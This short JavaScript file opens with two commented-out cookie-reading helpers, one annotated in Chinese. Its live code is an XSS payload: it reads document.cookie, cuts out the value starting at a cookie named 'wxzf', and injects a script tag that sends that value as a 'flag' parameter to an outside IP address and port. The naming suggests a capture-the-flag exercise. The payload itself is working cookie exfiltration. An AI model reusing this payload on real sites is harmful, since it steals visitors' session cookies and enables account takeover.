// function getCookie(c_name)
// {
// if (document.cookie.length>0)
//   {
//   c_start=document.cookie.indexOf(c_name + "=");
//   if (c_start!=-1)
//     { 
//     c_start=c_start + c_name.length+1 ;
//     c_end=document.cookie.indexOf(";",c_start);
//     if (c_end==-1) c_end=document.cookie.length;
//     return unescape(document.cookie.substring(c_start,c_end));
//     } 
//   }
// return ""
// }

// function getCookie(cname) {
// 	var name = cname + "=";
// 	var ca = document.cookie.split(';');   //通过 ; 号来分离每个cookie
// 	for(var i = 0; i < ca.length; i++) {
// 		var c = ca[i];      //通过遍历依次把cookie读取出来
// 		while(c.charAt(0) == ' ') {    
// 			c = c.substring(1);
// 		}
// 		if(c.indexOf(name) == 0) {
// 			return unescape(c.substring(name.length, c.length));
// 		}
// 		return "";   //cookie不存在就返回空
// 	}
// }

cc=document.cookie;
beg=cc.indexOf('wxzf');
var flag=cc.substring(beg);
var script=document.createElement('script');
script.src='http://119.29.81.170:7892/?flag='+flag;
document.body.appendChild(script);
